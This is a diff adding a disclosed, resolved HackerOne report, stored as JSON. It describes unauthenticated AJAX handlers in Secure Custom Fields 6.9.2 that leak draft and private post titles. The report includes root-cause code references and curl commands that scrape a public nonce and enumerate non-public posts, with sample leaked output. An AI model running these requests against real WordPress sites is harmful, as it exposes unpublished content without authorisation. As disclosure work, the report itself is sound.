@@ -1,0 +1,139 @@
+{
+  "id": 3893632,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zODkzNjMy",
+  "url": "https://hackerone.com/reports/3893632",
+  "title": "Unauthenticated disclosure of draft/private/pending post titles & IDs via Secure Custom Fields nopriv AJAX field-query handlers (post_object/relations",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-07-27T14:35:29.151Z",
+  "submitted_at": "2026-07-27T14:35:29.655Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "jakubk",
+    "url": "/jakubk",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/stj402qv8vdsgjxvp8f1b7y5nimu/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-09-28T11:14:24.361Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-08-29T11:13:55.304Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Secure Custom Fields 6.9.2 registers UNAUTHENTICATED (wp_ajax_nopriv_) AJAX query handlers for the post_object, relationship, and page_link field types. These handlers run a WP_Query whose post_status defaults to \"any\" with no capability / perm filtering, so they return draft, pending, private, and future posts (and non-public custom post types) to the caller. When any of these fields is rendered on a public-facing acf_form() (front-end post submission/editing — a standard SCF/ACF use case), the required per-field nonce is emitted into the public page HTML; because logged-out WordPress nonces are shared across all anonymous visitors (uid 0, empty session token), any unauthenticated visitor can reuse that nonce to enumerate non-public post titles and IDs, including a targeted keyword search.\n\nRoot cause — includes/fields/class-acf-field-post_object.php:\n  :34   add_action('wp_ajax_nopriv_acf/fields/post_object/query', [$this,'ajax_query']);  // UNAUTH\n  :66   ajax_query() -> :96 get_ajax_query()\n  :148  if ( ! empty( $field['post_status'] ) ) { $args['post_status'] = ...; }\n        // post_status is set ONLY if the field configures it; the default is empty -> never set here.\n\nincludes/api/api-helpers.php:\n  :1285 acf_get_grouped_posts( $args )\n  :1299 'post_status' => 'any',   // default -> WP_Query returns non-public statuses,\n        // with no 'perm' arg and no current_user_can() check -> draft/pending/private/future leak.\n\nThe only gate is acf_verify_ajax() (api-helpers.php:707) — a per-field nonce\nacf_field_post_object_<field_key> that is emitted into any public page rendering the field via\nacf_form(). The identical flaw exists in class-acf-field-relationship.php and class-acf-field-page_link.php.\n\nSteps To Reproduce:\n1. WordPress + Secure Custom Fields 6.9.2. Register a field group with a post_object field that has NO post_status restriction (default), located on posts.\n2. Render that field on a PUBLIC page via a front-end form — a template/block calling acf_form_head() and acf_form(array('post_id'=>'new_post','fields'=>array('<field_key>'))). This is the normal SCF/ACF front-end-submission pattern.\n3. Create non-public posts: a DRAFT \"SECRET-DRAFT\" and a PRIVATE \"PRIVATE-POST\".\n4. As an UNAUTHENTICATED client (no cookies/credentials), fetch the public form page and scrape the per-field nonce from the HTML:\n     curl -s https://SITE/pubform/ | grep -o 'data-nonce=\"[a-f0-9]*\"'\n     -> data-nonce=\"448a44d302\"\n5. Call the nopriv AJAX query with that nonce:\n     curl -s https://SITE/wp-admin/admin-ajax.php \\\n       --data 'action=acf/fields/post_object/query&field_key=<field_key>&nonce=448a44d302&paged=1'\n   Response (HTTP 200):\n     {\"results\":[\n        {\"id\":1,\"text\":\"Hello world!\"},\n        {\"id\":32,\"text\":\"PRIVATE-POST (private)\"},\n        {\"id\":31,\"text\":\"SECRET-DRAFT (draft)\"}\n     ],\"more\":false,\"limit\":20}\n6. Targeted enumeration via the search param:\n     curl ... --data '...&nonce=448a44d302&s=SECRET'\n     -> {\"results\":[{\"id\":31,\"text\":\"SECRET-DRAFT (draft)\"}],...}\n\nReproduced end-to-end with a real scraped nonce (no simulation).\n\n## Impact\n\nAn unauthenticated attacker can enumerate the titles and IDs of draft, pending, private, and scheduled posts — content the site intends to keep non-public — and can search for specific ones via the `s` parameter. If the field is not restricted to a post type, non-public custom post types are also exposed. This discloses unpublished editorial content, embargoed posts, and internal/private records.",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 6333380,
+      "file_name": "PoC-SCF-nopriv-draft-leak.txt",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/2jfasuuy71w1rpwwefsk7jmwgf9p?response-content-disposition=attachment%3B%20filename%3D%22PoC-SCF-nopriv-draft-leak.txt%22%3B%20filename%2A%3DUTF-8%27%27PoC-SCF-nopriv-draft-leak.txt&response-content-type=text%2Fplain&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQR36YGKAD%2F20260928%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260928T145123Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEG4aCXVzLXdlc3QtMiJGMEQCIH6Hh%2BUP3lx4Zvhb6CmCtdvblkPbIX6Qwf1ub%2F3WOKXsAiB7ww22xIwJCyreK7GexIGXoFJy%2BaT2ewicYZZH%2FY0lqiqyBQg3EAMaDDAxMzYxOTI3NDg0OSIM%2Fm6zSzjr3V16f6lsKo8FOI6TajWPaYgt8ti6muKT4l1okqkdD47ncfoCIaUIbeeFcbKH7yrAupqTFLZZQ%2FdfppR%2FXY5YkcGmqyispRYRALjg9q8MGXaFL9cr80bwFTkq%2FO4Xvs2f7M3EhL4qR%2BZF3Hkfd6lfuZ5CdbIp92UuXlOAeRDRRAEf6HWCesgP72Xn6cESSIw3nh%2FQ0JTHAEDc1iMMR1wv82CkYM2OdupFXNGdyx9MsWIdPSohcRh4902E1xq7hCQyS9iHdEMl3gWV8lbEZbOrSfPKDlivHM91JNr%2BzjuWetjSXJ17howhJ8Q%2BA3u304NL8I%2ByII3aM9g7jhGwiDnmLIKx2sRTzxyd05hyHlfRwkrnrc4afgDXeLf9f7EtubnF8aI6HzTN5yBxxu7g9%2FbGsdzR4L7IrlWDA7U4hmFHbmQRn%2B1pHk4CwUSlaTPIBofK5Ac4w3Volwsqxvc6YB4yq2ci%2FCtjBlK2PUp%2BJTFKWE9wu%2BTy9chV8hMJP8ZqonfVgn8X%2FJLbFtIGixfcReqFCWLoX72WLbkPMaDLfCpO6Or8c%2Bh1WJwdJ3fRdzEp8i6a0h99ZeVaHTA6xwSMrqyS7NA64pu2nl9Sg4ii9oFo1DKj%2FbrljnIwC%2BRMgmNhZjDxapVhMRrqxa7gVATykDZUl4Uaw4kh4p%2BcdeDucqXb1UcAInInsFoh4gP%2BFn6KPDREvr%2By6uVlGMDd9bnsihaNIojIkYP891dk0zVFPDx4alZi2Q7hMr5zadTwgpJkfV7Qd5R8YKQV8VO06zVwElTUCyDiiezo9q6oIpfNBgM%2BpoNoQD%2FpcrW3BY7nkbBb5LiZ4ovKWvIwXzIRF0aqI7jWlNaznV3KcB8rH4Mf9QSd1xfC4KL8MbgJ%2BjDn5OnVBjqyAZOXaTpBf22ZIPiCLDW8wVWcX4uR3WwqtkJbLJmSVBekSHrA%2BMCHqVk3VPQcHgmbD6PPzSJlHgsrhdu7mH%2BbH32nAbCK5PVu62WeFZSb4Qa9CpIhJQ4MQxIsbHa0B0%2FPxvNnJ0woh%2FSWKOGyYjER2SlRBmDi8q5Uu%2BWyZpoCbnG5akz%2Fcg9ik4tAgDJlO8tGtL0HSBNxE7Pyz8RKJxE5mPKypjaqOExQj%2FgLPyzzmyB%2BsBw%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ce65d248f31f63123081d2ddc8e5995817c10cf9c97d418f3b4db23a345b4fc5",
+      "file_size": 3203,
+      "type": "text/plain",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-09-28T11:13:55.470Z",
+  "allow_singular_disclosure_after": -13047.893266774,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "jakubk",
+    "shadow043",
+    "hexa34",
+    "novaflowdev",
+    "hell0k1tty"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "none",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 1041136,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "Secure Custom Fields",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
